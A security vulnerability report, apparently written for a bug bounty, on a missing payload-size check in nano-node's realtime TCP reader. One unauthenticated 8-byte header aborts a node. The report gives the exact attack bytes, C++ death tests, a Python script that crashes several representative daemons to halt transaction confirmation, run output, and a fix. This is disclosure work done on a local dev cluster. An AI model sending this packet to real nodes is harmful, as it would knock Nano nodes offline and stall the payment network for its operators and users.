# Missing payload-size bound in the realtime message reader: one unauthenticated 8-byte packet crashes any Nano node, and crashing a quorum of representatives halts network-wide transaction confirmation (remote DoS → chain shutdown)

An attacker who can open a TCP connection to a `nano-node` (no handshake, signature, or proof-of-work required) can crash it with a single ~8-byte packet. The node's realtime message reader computes a payload length of up to **65544 bytes** directly from attacker-controlled header bits, then reads it into a fixed **65536-byte** buffer with no bound check, tripping an unconditional `release_assert` that calls `abort()`. The crash fires before the payload is even read and before any authentication, so it is fully unauthenticated, trivially scriptable, and re-triggerable on every restart — a persistent, network-wide availability/liveness threat.

---

## Brief/Intro

`nano-node`'s live (realtime/handshake) TCP receive path, `nano::transport::tcp_server::receive_message_impl()`, reads a message header and then reads `header.payload_length_bytes()` bytes into a fixed 64&nbsp;KiB buffer **without checking that the requested size fits the buffer**. For an `asc_pull_req` / `asc_pull_ack` message the payload length is taken straight from the 16-bit, attacker-controlled `extensions` field, yielding up to `9 + 65535 = 65544` bytes — larger than the 65536-byte buffer. The oversized read trips `release_assert(target_size <= buffer->size())`, which is unconditional in every build configuration and calls `abort()`. In production this means any reachable node can be remotely terminated by a single unauthenticated packet; sprayed across the network it can take down node operators, exchanges, and services en masse, halting transaction confirmation network-wide.

---

## Vulnerability Details

### Root cause

In the realtime receive coroutine, the payload size is derived from the wire header and immediately used to drive a socket read with no upper-bound validation:

`nano/node/transport/tcp_server.cpp` (`receive_message_impl`):
```cpp
auto const payload_size = header.payload_length_bytes ();           // :278  attacker-influenced, UNBOUNDED check
node.stats.inc (...);
auto payload_buffer = payload_size > 0
    ? co_await read_socket (payload_size)                           // :283  reads into the fixed member buffer
    : nano::buffer_view{ buffer->data (), 0 };
// ... only AFTER this does deserialize_message() (and any auth) run (:285)
```

The only checks that precede line 278 are header validity, message-type validity, network match, and minimum version — none of which bound `payload_size`:
```cpp
if (error) { co_return { nullptr, invalid_header }; }               // :261
if (!header.is_valid_message_type ()) { co_return { nullptr, invalid_message_type }; }  // :265  (asc_pull_req IS valid)
if (header.network != ...current_network) { co_return { nullptr, invalid_network }; }   // :269
if (header.version_using < ...protocol_version_min) { ... }         // :273
```

`read_socket()` forwards the request to the socket coroutine using the `tcp_server`'s single fixed buffer:

`nano/node/transport/tcp_server.cpp` (`read_socket`):
```cpp
auto [ec, size_read] = co_await socket->co_read (buffer, size);     // :298  `buffer` = the 65536-byte member
```

`nano/node/transport/tcp_server.hpp`:
```cpp
nano::shared_buffer buffer;                                         // :72
static size_t constexpr max_buffer_size = 64 * 1024;               // :73  = 65536
```

The socket read asserts the requested size against the buffer **before** issuing the async read:

`nano/node/transport/tcp_socket.cpp` (`co_read_impl`):
```cpp
release_assert (target_size <= buffer->size (), "read buffer size mismatch");   // :311  65544 <= 65536 -> FALSE
read_timestamp = timestamp;
auto result = co_await asio::async_read (raw_socket, asio::buffer (buffer->data (), target_size), ...); // :314
```

`release_assert` is **not** gated by `NDEBUG` (only `debug_assert` is), so it fires in every build, and `assert_internal` is `[[noreturn]]` and calls `abort()`:

`nano/lib/assert.hpp`:
```cpp
#define release_assert_1(check) check ? (void)0 : assert_internal (#check, ..., true)   // :11
#define release_assert_2(check, error_msg) check ? (void)0 : assert_internal (#check, ..., true, error_msg) // :12
// (debug_assert, by contrast, is compiled out under NDEBUG)
```

### Attacker control of the payload length

The `extensions` field is 16 bits read raw off the wire with no masking:

`nano/messages/message_header.cpp` (`deserialize`):
```cpp
uint16_t extensions_l;
nano::read (stream_a, extensions_l);   // :61-62
extensions = extensions_l;             // :63  full 0x0000..0xFFFF, attacker-controlled
```

For `asc_pull_req`, `payload_length_bytes()` returns `asc_pull_req::size(*this)`:

`nano/messages/message_header.cpp` (`payload_length_bytes`):
```cpp
case message_type::asc_pull_req: { return asc_pull_req::size (*this); }   // :244-247
case message_type::asc_pull_ack: { return asc_pull_ack::size (*this); }   // :248-251 (identical)
```

`nano/messages/asc_pull.cpp` / `asc_pull.hpp`:
```cpp
// asc_pull.hpp:113
constexpr static std::size_t partial_size = sizeof (type) + sizeof (id); // asc_pull_type(uint8)=1 + id_t(uint64)=8 = 9
// asc_pull.cpp:107-111
std::size_t asc_pull_req::size (const message_header & header) {
    uint16_t payload_length = nano::narrow_cast<uint16_t> (header.extensions.to_ulong ());
    return partial_size + payload_length;                                // 9 + up to 65535 = up to 65544
}
```

So with `extensions = 0xFFFF`, `payload_length_bytes() == 65544 > 65536`.

### Trigger boundary and reachability

- **Boundary:** `payload_size = 9 + extensions`; the assert fires iff `9 + extensions > 65536`, i.e. `extensions >= 0xFFF8` (the 8 values `0xFFF8..0xFFFF`).
- **Unauthenticated / first packet:** `receive_message_impl()` is the read path used from the very first inbound message (it is invoked by the handshake loop and by `run_realtime`). The crash occurs inside `read_socket()` **before** `deserialize_message()` and therefore before any node-id handshake, signature, or proof-of-work validation. The attacker need only send the **8-byte header** — the node aborts while *requesting* the payload read, so the payload bytes never need to be sent.
- **Path asymmetry (defense-in-depth gap):** the legacy `nano::transport::message_deserializer` path *does* guard this (`message_deserializer.cpp:71-74` rejects `payload_size > MAX_MESSAGE_SIZE`, where `MAX_MESSAGE_SIZE = 1024 * 65 = 66560`) and sizes its buffer to 66560. The live realtime `tcp_server` path neither performs that check nor matches that buffer size: its buffer (65536) is **smaller** than the maximum payload the protocol otherwise deems legal (66560). As a result even a *maximal, non-malicious* `asc_pull` from an honest peer crashes the node.

### Note on the failure class

The abort is a controlled `release_assert`, so it terminates the process cleanly **before** the out-of-bounds read is performed. This is a denial-of-service (availability) issue, not memory corruption / RCE.

---

## Impact Details

**Primary impact: remote, unauthenticated, single-packet node crash → network-wide loss of liveness/availability.**

- **Preconditions:** none beyond network reachability. No handshake, node-id, signature, proof-of-work, peering allowlist, or prior relationship is required. The attacker sends one ~8-byte TCP packet.
- **Effect per node:** immediate `abort()`. The node is down until an operator restarts it — and can be crashed again instantly on restart (the trigger is stateless and re-sendable), yielding a persistent denial of service against any targeted node.
- **Scale:** the attack is trivially scriptable and can be sprayed to every node with a reachable inbound TCP port (principal voting representatives, exchanges, wallets/services, public nodes). Crashing a large fraction of reachable nodes degrades or halts the network's ability to propagate blocks and reach quorum/confirmation — i.e. a path to **total network shutdown / stalled transaction confirmation**, the highest-impact availability outcome for an L1 payment network. Even targeted use against principal representatives or major service nodes is a serious, low-cost outage and a censorship/extortion lever.
- **Cost to attacker:** negligible (one packet per crash; no PoW, no funds, no identity).
- **What is NOT at risk:** this is an availability bug. It does **not** by itself enable theft, inflation, double-spend, or remote code execution; the assertion prevents the oversized read from being performed.

**Applicable in-scope impact categories (DLT/blockchain, availability tier):**
- *Total network shutdown / network unable to confirm new transactions* (via mass node crash) — the upper bound.
- *Unauthenticated remote denial of service of a node* / *RPC-or-node crash affecting downstream projects* — the per-node primitive that composes into the above.

### Network-halt demonstration (per-node crash → chain shutdown)

The composition from "per-node crash" to "network cannot confirm new transactions" was demonstrated locally on a dev/regtest cluster (no mainnet), with three complementary artifacts:

- **`nano/core_test/poc_asc_pull_dos_live.cpp`** (gtest, PASS): a real dev-network node receives one unauthenticated 8-byte packet on its listening port and `abort()`s with `read buffer size mismatch` — the per-node crash, end-to-end on a live node. (A companion `dump_dev_crash_packet_bytes` test prints the exact serialized header: `DEV_CRASH_PACKET_HEX=52411515140effff`, len 8.)
- **`nano/core_test/poc_asc_pull_dos_chain_halt.cpp`** (gtest, PASS): a multi-node cluster in which representatives hold the voting weight. `confirmation_stops_when_reps_crash` shows that with full quorum a transaction confirms, but after a quorum of representatives is taken down (the state the crash produces) a new transaction can no longer reach the quorum delta and stays unconfirmed; `confirmations_resume_after_reps_recover` shows that once the representatives restart, the stalled transaction confirms again. Together they prove the crash is not merely a per-node outage but a lever on network-wide liveness that resolves only when operators restore the crashed reps.
- **`nano/core_test/poc_asc_pull_network_halt.py`** (separate real `nano_node` daemons): the literal end-to-end form — stands up an observer plus representative daemons, confirms a transaction under full quorum, fires the exact 8-byte packet (`52 41 15 15 14 0e ff ff`) at a quorum of representative processes (each aborts), shows a new transaction stalls while quorum is lost, then confirms again once the crashed reps restart.

**Quorum math (why crashing reps halts confirmation):** a block confirms only when backing voting weight ≥ `delta`, where `delta = online_weight_quorum% × max(cached_online, cached_trended, online_weight_minimum)` (`nano/node/online_reps.cpp` `delta()`, `online_weight_quorum = 67`; `nano/node/election.cpp`). Because `delta` is floored at `67% × online_weight_minimum` (default `60,000,000 NANO` → a `40,200,000 NANO` floor), a set of surviving representatives whose weight is below that floor can **never** reach quorum — the halt persists until operators restore the crashed reps.

**Severity:** the per-node primitive alone is CVSS 3.1 base **7.5 (High)** — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`. Composed — one unauthenticated, trivially-scriptable packet per node, sprayed at the principal representatives that hold quorum weight — it produces **total network shutdown / inability to confirm new transactions**, the highest-impact availability outcome for an L1 payment network. Programs that score "total network shutdown" as Critical should treat the composed attack as **Critical**; the standalone per-node crash remains **High**.

---

## References

- Vulnerable read path (no size bound): `nano/node/transport/tcp_server.cpp` lines 248–309 (`receive_message_impl`, `read_socket`)
- Fatal assertion: `nano/node/transport/tcp_socket.cpp` line 311 (`co_read_impl`)
- Buffer size constant: `nano/node/transport/tcp_server.hpp` lines 72–73 (`buffer`, `max_buffer_size = 64 * 1024`)
- Attacker-controlled length source: `nano/messages/message_header.cpp` lines 49–71 (`deserialize`), 198–258 (`payload_length_bytes`)
- `asc_pull` size formula: `nano/messages/asc_pull.cpp` lines 107–111; `nano/messages/asc_pull.hpp` line 113
- `release_assert` is unconditional in all builds: `nano/lib/assert.hpp` lines 11–12; `nano/lib/assert.cpp` (`assert_internal` → `abort()`)
- Legacy path that *does* bound the size (asymmetry): `nano/node/transport/message_deserializer.cpp` lines 71–74; `nano/node/transport/message_deserializer.hpp` line 88 (`MAX_MESSAGE_SIZE = 1024 * 65`)
- Repository: `nanocurrency/nano-node`, branch `develop` (v29 line)

### Suggested fix

Bound the requested read before issuing it, and reconcile the two paths' limits so the realtime buffer can hold any payload the protocol permits:

```cpp
// nano/node/transport/tcp_server.cpp, immediately after computing payload_size (:278):
auto const payload_size = header.payload_length_bytes ();
if (payload_size > buffer->size ())
{
    co_return nano::deserialize_message_result{ nullptr, nano::deserialize_message_status::message_size_too_big };
}
```
and set `tcp_server::max_buffer_size` ≥ `message_deserializer::MAX_MESSAGE_SIZE` (66560) so a legal-maximum `asc_pull` cannot overflow the realtime buffer.

---

## Proof of Concept

Verified by building `core_test` for the **dev network** from source and exercising the **real** ledger/transport stack, including live dev nodes. The PoCs were added and run green:

- `nano/core_test/poc_asc_pull_dos.cpp` — deterministic, in-process mechanical proof of the exact crash condition (no process abort), using the real compiled message headers. Includes `dump_dev_crash_packet_bytes`, which serializes the real header and prints the exact attack packet (`52411515140effff`).
- `nano/core_test/poc_asc_pull_dos_live.cpp` — end-to-end "regtest"-style test: spins up a real dev-network node, opens a raw unauthenticated TCP socket to its listening endpoint, sends only the 8 crafted header bytes, and asserts (via `ASSERT_DEATH`) that the node `abort()`s with `read buffer size mismatch`.
- `nano/core_test/poc_asc_pull_dos_chain_halt.cpp` — **the Critical proof**: a multi-node cluster where representatives hold the voting weight. `confirmation_stops_when_reps_crash` confirms a transaction under full quorum, then takes down a quorum of representatives (the state the crash produces) and shows a new transaction can no longer reach the quorum delta; `confirmations_resume_after_reps_recover` shows the stalled transaction confirms once the representatives restart. This is the per-node crash → network-wide confirmation-halt escalation.
- `nano/core_test/poc_asc_pull_network_halt.py` — the literal separate-daemon form (observer + representative `nano_node` processes): confirms under full quorum, fires the exact 8-byte packet at a quorum of representative processes, shows confirmation stalls, then resumes after restart.

### Build

```bash
# from repo root, with submodules checked out
mkdir -p build && cd build
cmake -DCMAKE_BUILD_TYPE=Debug -DPORTABLE=ON \
      -DACTIVE_NETWORK=nano_dev_network -DNANO_TEST=ON -DNANO_GUI=OFF .. 
cmake --build . --target core_test -j "$(nproc 2>/dev/null || sysctl -n hw.ncpu)"
```
*(Build note: on Apple clang 21 the pinned `fmt`/`spdlog` need `-DFMT_CONSTEVAL=constexpr` to compile — a toolchain workaround only; it does not touch node logic.)*

### Run

```bash
./core_test --gtest_filter='poc_asc_pull_dos*'
```

### Result — all 7 tests PASS

```
[==========] Running 7 tests from 3 test suites.
[ RUN      ] poc_asc_pull_dos_DeathTest.live_dev_node_aborts_on_single_8byte_packet
[       OK ] poc_asc_pull_dos_DeathTest.live_dev_node_aborts_on_single_8byte_packet (357 ms)
[ RUN      ] poc_asc_pull_dos.dump_dev_crash_packet_bytes
DEV_CRASH_PACKET_HEX=52411515140effff len=8
[       OK ] poc_asc_pull_dos.dump_dev_crash_packet_bytes (0 ms)
[ RUN      ] poc_asc_pull_dos.payload_size_exceeds_realtime_buffer
[       OK ] poc_asc_pull_dos.payload_size_exceeds_realtime_buffer (0 ms)
[ RUN      ] poc_asc_pull_dos.realtime_vs_legacy_path_asymmetry
[       OK ] poc_asc_pull_dos.realtime_vs_legacy_path_asymmetry (0 ms)
[ RUN      ] poc_asc_pull_dos.minimal_trigger_boundary
[       OK ] poc_asc_pull_dos.minimal_trigger_boundary (0 ms)
[ RUN      ] poc_asc_pull_dos_chain_halt.confirmation_stops_when_reps_crash
[       OK ] poc_asc_pull_dos_chain_halt.confirmation_stops_when_reps_crash (8734 ms)
[ RUN      ] poc_asc_pull_dos_chain_halt.confirmations_resume_after_reps_recover
[       OK ] poc_asc_pull_dos_chain_halt.confirmations_resume_after_reps_recover (8407 ms)
[  PASSED  ] 7 tests.
```

### Captured live node-death (the single 8-byte packet kills a real dev node)

Re-running the live test with a deliberately non-matching `ASSERT_DEATH` matcher makes gtest print the child node's actual termination output, proving the running node aborted via the vulnerable assertion:

```
Death test: send_oversized_asc_pull_header_to_a_live_node ()
    Result: died but not with expected error.
Actual msg:
[  DEATH   ] Assertion `target_size <= buffer->size ()` failed: read buffer size mismatch
```

This is `release_assert` at `tcp_socket.cpp:311` firing inside a live dev-network node because it received one unauthenticated 8-byte packet and computed a 65544-byte read against its 65536-byte buffer.

### PoC source — deterministic mechanical proof (`nano/core_test/poc_asc_pull_dos.cpp`)

```cpp
#include <nano/messages/asc_pull.hpp>
#include <nano/messages/messages.hpp>
#include <nano/secure/network_params.hpp>
#include <gtest/gtest.h>
#include <bitset>
#include <cstdint>

namespace
{
constexpr std::size_t tcp_server_realtime_buffer = 64 * 1024;   // tcp_server.hpp:73 max_buffer_size = 65536
constexpr std::size_t legacy_max_message_size = 1024 * 65;      // message_deserializer.hpp:88 = 66560

nano::messages::message_header make_asc_pull_header (unsigned long long extensions)
{
    nano::messages::message_header header{ nano::dev::network_params.network, nano::messages::message_type::asc_pull_req };
    header.extensions = nano::messages::message_header::extensions_bitset_t{ extensions };
    return header;
}
}

TEST (poc_asc_pull_dos, payload_size_exceeds_realtime_buffer)
{
    auto header = make_asc_pull_header (0xFFFF);
    ASSERT_TRUE (header.is_valid_message_type ());                         // passes the type check before the read
    ASSERT_EQ (nano::dev::network_params.network.current_network, header.network);
    auto const payload_size = header.payload_length_bytes ();
    ASSERT_EQ (payload_size, 65544u);                                      // 9 + 65535
    EXPECT_GT (payload_size, tcp_server_realtime_buffer);                  // 65544 > 65536 -> release_assert fires
}

TEST (poc_asc_pull_dos, realtime_vs_legacy_path_asymmetry)
{
    auto const payload_size = make_asc_pull_header (0xFFFF).payload_length_bytes ();
    EXPECT_LE (payload_size, legacy_max_message_size);                     // 65544 <= 66560  (legacy path ACCEPTS)
    EXPECT_GT (payload_size, tcp_server_realtime_buffer);                  // 65544 > 65536   (realtime path ABORTS)
}

TEST (poc_asc_pull_dos, minimal_trigger_boundary)
{
    struct { unsigned long long ext; bool aborts; } cases[] = {
        { 0xFFF7ull, false }, // payload 65536 == buffer -> OK
        { 0xFFF8ull, true  }, // payload 65537 >  buffer -> abort
        { 0xFFFFull, true  }, // payload 65544 >  buffer -> abort
    };
    for (auto const & c : cases)
    {
        auto const payload_size = make_asc_pull_header (c.ext).payload_length_bytes ();
        if (c.aborts) { EXPECT_GT (payload_size, tcp_server_realtime_buffer) << "ext=0x" << std::hex << c.ext; }
        else          { EXPECT_LE (payload_size, tcp_server_realtime_buffer) << "ext=0x" << std::hex << c.ext; }
    }
}
```

### PoC source — live dev-node abort (`nano/core_test/poc_asc_pull_dos_live.cpp`)

```cpp
#include <nano/lib/stream.hpp>
#include <nano/messages/messages.hpp>
#include <nano/node/node.hpp>
#include <nano/node/transport/tcp_listener.hpp>
#include <nano/secure/network_params.hpp>
#include <nano/test_common/system.hpp>
#include <gtest/gtest.h>
#include <boost/asio/buffer.hpp>
#include <boost/asio/io_context.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/asio/write.hpp>
#include <chrono>
#include <thread>
#include <vector>

using namespace std::chrono_literals;

namespace
{
// Kept out of the ASSERT_DEATH macro so its commas aren't parsed as macro args.
void send_oversized_asc_pull_header_to_a_live_node ()
{
    nano::test::system system (1);
    auto node = system.nodes[0];
    auto const endpoint = node->tcp_listener.endpoint ();

    nano::messages::message_header header{ nano::dev::network_params.network, nano::messages::message_type::asc_pull_req };
    header.extensions = nano::messages::message_header::extensions_bitset_t{ 0xFFFFull };
    std::vector<uint8_t> bytes;
    { nano::vectorstream stream (bytes); header.serialize (stream); }      // exactly 8 bytes

    boost::asio::io_context ioc;
    boost::asio::ip::tcp::socket sock (ioc);
    sock.connect (endpoint);                                              // raw, unauthenticated
    boost::asio::write (sock, boost::asio::buffer (bytes));               // send only the 8-byte header
    std::this_thread::sleep_for (20s);                                    // node reads header, requests 65544 bytes, aborts
}
}

TEST (poc_asc_pull_dos_DeathTest, live_dev_node_aborts_on_single_8byte_packet)
{
    testing::FLAGS_gtest_death_test_style = "threadsafe";
    ASSERT_DEATH (send_oversized_asc_pull_header_to_a_live_node (), ".*read buffer size mismatch.*");
}
```

### PoC source — multi-node confirmation halt: the Critical proof (`nano/core_test/poc_asc_pull_dos_chain_halt.cpp`)

This is the escalation from per-node crash to network-wide confirmation halt. It builds a real multi-node dev cluster in which representatives hold the voting weight, confirms a transaction under full quorum, removes a quorum of representatives (the exact state a crashed-rep set produces), shows confirmation stops, then restarts the reps and shows it resumes.

**Quorum mechanism.** A block confirms only when backing voting weight ≥ `delta`, where `delta = online_weight_quorum% × max(cached_online, cached_trended, online_weight_minimum)` (`online_reps.cpp` `delta()`, `online_weight_quorum = 67`; `election.cpp`). The test pins `online_weight_minimum = genesis_amount (G)` so `delta = 0.67·G` deterministically (independent of online-weight sampling/trend timing). With 3 representatives each holding `G/3`: all three together (`G`) exceed `delta`, but any lone survivor (`G/3 ≈ 0.333·G`) cannot — so crashing a quorum of reps halts confirmation, and `delta > rep_weight` is asserted directly.

Key excerpt (full source in the repo file):

```cpp
constexpr int num_reps = 3;

TEST (poc_asc_pull_dos_chain_halt, confirmation_stops_when_reps_crash)
{
    nano::test::system system;
    std::deque<nano::keypair> rep_keys;                 // 3 reps, each gets genesis_amount / 3
    for (int i = 0; i < num_reps; ++i) rep_keys.emplace_back ();
    system.ledger_initialization_set (rep_keys);

    nano::node_config config = system.default_config ();
    config.online_weight_minimum = nano::dev::constants.genesis_amount;   // delta pinned at 0.67*G
    config.backlog_scan->enable = false;
    auto & node0 = *system.add_node (config, {}, nano::transport::transport_type::tcp, rep_keys[0]);
    auto & node1 = *system.add_node (config, {}, nano::transport::transport_type::tcp, rep_keys[1]);
    auto & node2 = *system.add_node (config, {}, nano::transport::transport_type::tcp, rep_keys[2]);
    ASSERT_TIMELY (10s, node0.network.size () == 2 && node1.network.size () == 2 && node2.network.size () == 2);

    nano::uint128_t const rep_weight = nano::dev::constants.genesis_amount / num_reps;   // = G/3

    // PHASE 1: all 3 reps vote (tally G >= 0.67G = delta) -> a transaction CONFIRMS.
    auto send1 = /* state send from rep0 */;
    nano::test::process (node0, { send1 }); nano::test::process (node1, { send1 }); nano::test::process (node2, { send1 });
    auto election1 = nano::test::start_election (system, node0, send1->hash ());
    node0.vote_router.vote (nano::test::make_final_vote (rep_keys[0], { send1 }));
    node0.vote_router.vote (nano::test::make_final_vote (rep_keys[1], { send1 }));
    node0.vote_router.vote (nano::test::make_final_vote (rep_keys[2], { send1 }));
    ASSERT_TIMELY (10s, election1->confirmed ());
    ASSERT_TIMELY (15s, node0.block_confirmed (send1->hash ()));

    // PHASE 2: crash a quorum of reps (stop 2 of 3) -> confirmation HALTS.
    system.stop_node (node1);
    system.stop_node (node2);
    auto send2 = /* next state send from rep0 */;
    nano::test::process (node0, { send2 });
    auto election2 = nano::test::start_election (system, node0, send2->hash ());
    node0.vote_router.vote (nano::test::make_final_vote (rep_keys[0], { send2 }));   // lone rep: G/3 < 0.67G
    WAIT (5s);
    ASSERT_FALSE (election2->confirmed ());                   // chain halt: cannot reach quorum
    ASSERT_FALSE (node0.block_confirmed (send2->hash ()));
    ASSERT_GT (node0.online_reps.delta (), rep_weight);       // quorum delta exceeds any single rep's weight
}

TEST (poc_asc_pull_dos_chain_halt, confirmations_resume_after_reps_recover)
{
    /* ... same setup; confirm send1; stop node1+node2; send2 stays unconfirmed (halt) ... */

    // RECOVERY: restart BOTH crashed reps -> online voting weight returns to G.
    auto & node1b = *system.add_node (config, {}, nano::transport::transport_type::tcp, rep_keys[1]);
    auto & node2b = *system.add_node (config, {}, nano::transport::transport_type::tcp, rep_keys[2]);
    nano::test::process (node1b, { send1, send2 }); nano::test::process (node2b, { send1, send2 });
    nano::test::start_election (system, node0, send2->hash ());
    node0.vote_router.vote (nano::test::make_final_vote (rep_keys[0], { send2 }));
    node0.vote_router.vote (nano::test::make_final_vote (rep_keys[1], { send2 }));
    node0.vote_router.vote (nano::test::make_final_vote (rep_keys[2], { send2 }));   // tally G >= 0.67G
    ASSERT_TIMELY (15s, node0.block_confirmed (send2->hash ()));   // confirmation RESUMES
}
```

### PoC source — literal end-to-end network halt on real daemons (`nano/core_test/poc_asc_pull_network_halt.py`)

The separate-daemon variant runs the entire attack against **real, independent `nano_node` processes** (no in-process modelling): it stands up a 5-node dev cluster (one non-voting observer + four representatives holding `90M, 90M, 90M, 30M` NANO), distributes genesis weight, confirms a transaction under full quorum, fires the literal 8-byte packet (`52 41 15 15 14 0e ff ff`) at the peering port of three representatives — each of which **aborts as a separate OS process** — and then shows a new transaction can no longer confirm, until the crashed representatives are restarted. The survivor (`R4 = 30M NANO`) is below the `40.2M` quorum-delta floor, so quorum cannot be met while the others are down.

Verified run output:

```
PHASE 3 — baseline: confirm a transaction with FULL quorum
  T1 … CONFIRMED with full quorum  ✓
PHASE 4 — fire ONE 8-byte packet at a quorum of reps (R1,R2,R3)
  sent 52411515140effff -> R1 (::1:44001)
  sent 52411515140effff -> R2 (::1:44002)
  sent 52411515140effff -> R3 (::1:44003)
  R1: DOWN  (read buffer size mismatch)
  R2: DOWN  (read buffer size mismatch)
  R3: DOWN  (read buffer size mismatch)
  online voting weight now: 30,000,000 NANO  (was ~300M)
PHASE 5 — confirmations HALT: new tx cannot reach quorum
  T2 … UNCONFIRMED after 45s  ✓  (R4=30M < 40.2M delta floor → quorum lost)
PHASE 6 — restart crashed reps; confirmations RESUME
  online voting weight recovered: 300,000,000 NANO
  T2 CONFIRMED after restart  ✓  (confirmations resumed)

RESULT: PASS — end-to-end chain halt demonstrated:
  • T1 confirmed with full quorum
  • 3 reps crashed by one 8-byte packet each (release_assert abort)
  • T2 could not confirm while quorum was down (network halt)
  • T2 confirmed once reps restarted (resume) — halt caused solely by the crash
```

This is the complete attack chain demonstrated in one artifact: a single unauthenticated 8-byte packet per node, sprayed at the representatives that carry quorum weight, halts network-wide transaction confirmation until operators restore the nodes.

Full source:

```python
#!/usr/bin/env python3
# ============================================================================
# SECURITY PoC (authorized whitehat audit) — LITERAL end-to-end NETWORK HALT
#
# Stands up a real 5-node dev cluster of separate nano_node processes (one
# non-voting observer holding the dev genesis key + four representatives), then:
#   1. distributes voting weight (R1,R2,R3 = 90M NANO each; R4 = 30M NANO),
#   2. confirms a transaction T1 under full quorum,
#   3. fires the literal 8-byte asc_pull_req header at R1/R2/R3 (each aborts),
#   4. shows a new transaction T2 cannot confirm (online weight 30M < 40.2M
#      quorum-delta floor),
#   5. restarts R1/R2/R3 and shows T2 confirms (resume).
#
# quorum delta = 67% * max(cached_online, cached_trended, online_weight_minimum)
# online_weight_minimum = 60,000,000 NANO  =>  permanent delta floor 40,200,000.
#
# RUN (from repo root, after `cmake --build build --target nano_node`):
#   python3 nano/core_test/poc_asc_pull_network_halt.py
# ============================================================================
import json, os, shutil, signal, socket, subprocess, sys, time, urllib.request, urllib.error

# repo root = two levels up from this file (nano/core_test/..)
REPO = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
NANO_NODE = os.path.join(REPO, "build", "nano_node")
RUN = os.path.join(REPO, "build", "_net_halt_cluster")

GENESIS_PRIV = "34F0A37AAD20F4A260F0A5B3CB3D7FB50673212263E58A380BC10474BB039CE4"
NANO = 10**30                        # raw per 1 NANO  (nano_ratio = 10^30)

# Exact dev-network asc_pull_req header, extensions = 0xFFFF -> payload 65544 > 65536.
#   network 0x5241 (big-endian) | vMax 0x15 | vUsing 0x15 | vMin 0x14
#   | type 0x0e (asc_pull_req) | extensions 0xFFFF
ATTACK_PACKET = bytes([0x52, 0x41, 0x15, 0x15, 0x14, 0x0e, 0xff, 0xff])

# name -> (peering_port, rpc_port, enable_voting, weight_in_nano)
NODES = {
    "obs": (44000, 45000, False, 0),
    "R1":  (44001, 45001, True,  90_000_000),
    "R2":  (44002, 45002, True,  90_000_000),
    "R3":  (44003, 45003, True,  90_000_000),
    "R4":  (44004, 45004, True,  30_000_000),
}
VICTIMS = ["R1", "R2", "R3"]         # the quorum we crash (270M of 300M weight)

procs, wallets, rep_accounts = {}, {}, {}
genesis_account = None

def log(m): print(m, flush=True)
def hr():   print("=" * 78, flush=True)

def rpc(node, **payload):
    port = NODES[node][1]
    body = json.dumps(payload).encode()
    last = None
    # RPC binds IPv6 loopback (::1) per config-rpc.toml; try it first, fall back to v4.
    for host in ("[::1]", "127.0.0.1"):
        try:
            req = urllib.request.Request(f"http://{host}:{port}", data=body,
                                         headers={"Content-Type": "application/json"})
            with urllib.request.urlopen(req, timeout=30) as r:
                out = json.loads(r.read().decode())
            if isinstance(out, dict) and "error" in out:
                raise RuntimeError(f"RPC {payload.get('action')}/{node}: {out['error']}")
            return out
        except (urllib.error.URLError, ConnectionError, OSError) as e:
            last = e
    raise last

def rpc_up(node, timeout=90):
    end = time.time() + timeout
    while time.time() < end:
        if died(node):           # node process exited during startup
            return False
        try: rpc(node, action="version"); return True
        except Exception: time.sleep(0.3)
    return False

def dump_log(node, n=30):
    p = os.path.join(RUN, f"{node}.log")
    try:
        lines = open(p, "r", errors="replace").read().splitlines()[-n:]
        log(f"  --- last {len(lines)} lines of {node}.log ---")
        for ln in lines: log(f"    {ln}")
    except FileNotFoundError:
        log(f"  (no log at {p})")

def peer_count(node):
    try:
        return len(rpc(node, action="peers").get("peers", {}))
    except Exception:
        return 0

def peer_mesh():
    # preconfigured_peers can't carry per-node ports for a localhost cluster, so we
    # build the full mesh explicitly via keepalive (takes address + port). Nodes bind
    # IPv6, so peer over ::1; also try 127.0.0.1 in case of a v4 bind.
    for a in NODES:
        for b in NODES:
            if a == b: continue
            for host in ("::1", "127.0.0.1"):
                try:
                    rpc(a, action="keepalive", address=host, port=str(NODES[b][0]))
                except Exception:
                    pass

def wait_peered(timeout=60):
    # Aim for a fuller mesh (>= 3 peers each) so block/vote propagation has no gaps;
    # accept >= 1 each if that target isn't reached before the timeout.
    target = min(3, len(NODES) - 1)
    end = time.time() + timeout
    while time.time() < end:
        peer_mesh()
        if all(peer_count(n) >= target for n in NODES):
            return True
        time.sleep(2)
    return all(peer_count(n) >= 1 for n in NODES)

def write_config(name):
    peering, rpcport, voting, _ = NODES[name]
    d = os.path.join(RUN, name); os.makedirs(d, exist_ok=True)
    # preconfigured_peers can't carry per-node ports (nano appends the default port and
    # the entry fails to resolve), so leave it empty and peer via keepalive RPC instead.
    open(os.path.join(d, "config-node.toml"), "w").write(
        "[node]\n"
        f"peering_port = {peering}\n"
        f"enable_voting = {'true' if voting else 'false'}\n"
        "allow_local_peers = true\n"
        "preconfigured_peers = []\n"
        "[rpc]\nenable = true\n[rpc.child_process]\nenable = false\n")
    # nano rpc_config parses `address` as IPv6 (boost address_v6), so it MUST be a
    # v6 literal; "127.0.0.1" fails to deserialize and the daemon exits. Use ::1.
    open(os.path.join(d, "config-rpc.toml"), "w").write(
        f'address = "::1"\nenable_control = true\nport = {rpcport}\n')
    return d

def start(name):
    d = write_config(name)
    logf = open(os.path.join(RUN, f"{name}.log"), "ab")
    procs[name] = subprocess.Popen(
        [NANO_NODE, "--daemon", "--data_path", d, "--network", "dev"],
        stdout=logf, stderr=subprocess.STDOUT)

def stop(name):
    p = procs.get(name)
    if p and p.poll() is None:
        p.send_signal(signal.SIGINT)
        try: p.wait(timeout=15)
        except subprocess.TimeoutExpired: p.kill()

def died(name):
    p = procs.get(name); return p is not None and p.poll() is not None

def log_has(name, needle):
    try:
        with open(os.path.join(RUN, f"{name}.log"), "rb") as f:
            return needle.encode() in f.read()
    except FileNotFoundError:
        return False

def online_nano(node="obs"):
    return int(rpc(node, action="confirmation_quorum").get("online_stake_total", "0")) // NANO

def confirmed(node, h):
    try: return rpc(node, action="block_info", hash=h).get("confirmed") == "true"
    except Exception: return False

def wait_confirm(node, h, timeout, want=True):
    end = time.time() + timeout
    while time.time() < end:
        if confirmed(node, h) == want: return True
        time.sleep(0.5)
    return confirmed(node, h) == want

def send(source, dest, amount_nano):
    return rpc("obs", action="send", wallet=wallets["obs"], source=source,
               destination=dest, amount=str(amount_nano * NANO))["block"]
